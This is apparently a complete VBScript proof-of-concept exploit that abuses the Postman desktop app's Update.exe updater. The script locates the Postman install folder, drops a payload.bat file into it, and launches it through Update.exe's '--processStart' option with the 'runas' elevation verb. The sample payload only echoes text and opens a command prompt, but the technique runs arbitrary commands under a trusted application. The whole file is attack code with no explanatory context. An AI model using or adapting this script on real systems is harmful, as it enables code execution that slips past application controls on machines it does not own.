Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set App = CreateObject("Shell.Application")

Postman = Shell.expandEnvironmentStrings("%localappdata%") + "\Postman\"
Payload = "echo :) && cmd"

For Each Item in FSO.GetFolder(Postman).SubFolders
  if InStr(1, Item.Name, "app-") = 1 Then
    Folder = Item.Name
  End if
Next

Set File = FSO.CreateTextFile(Postman + Folder + "\payload.bat", true)
File.WriteLine(Payload)
App.ShellExecute Postman + "Update.exe", "--processStart payload.bat", , "runas"
